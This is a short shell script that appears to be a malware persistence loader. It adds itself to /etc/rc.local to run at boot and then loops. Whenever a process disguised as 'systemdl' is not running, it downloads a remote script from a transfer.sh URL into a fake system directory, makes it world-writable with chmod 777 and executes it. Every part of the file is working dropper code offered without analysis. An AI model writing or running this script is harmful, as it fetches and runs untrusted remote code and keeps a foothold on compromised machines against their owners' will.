#!/bin/sh
dir="/var/systeml/"
shell="sysrun.sh"
shellUrl="https://transfer.sh/QkVDm/sysrun.sh"
shellPath=$dir$shell
runShell="sysrun-d"

#process name
PRO_NAME="systemdl"

#check process exist

# rc.local setting
grep "sysrun-daemon.sh" /etc/rc.local > /dev/null
if [ $? -eq 0 ]; then
    echo "rc.local found setting"
else
    echo "rc.local not found setting"
    chmod +x /etc/rc.local
    echo "nohup /var/sysrun-daemon.sh&" >> /etc/rc.local
fi
echo "[rc.local setting finish]"
echo "[sleep 30 second]"

sleep 30
echo "[loop start]"

#loop
while true ; do
 service=`ps aux | grep ${PRO_NAME} | grep -v grep`
 if [ ! "$service" ]; then
 # restart
 mkdir $dir

 if [ ! -f "$shellPath" ];then
 echo "shell file not exist"
  # download shell
 wget -O $shellPath $shellUrl

 else
 echo "shell file exist"
 if [ ! -s "$shellPath" ] ; then 
  echo 'shell file is empty'
  wget -O $shellPath $shellUrl　
 else
  echo 'shell file is not empty'
 fi

 fi

 # setting auth
 chmod 777 $shellPath

 # run
 $shellPath
 fi
 sleep 60
done
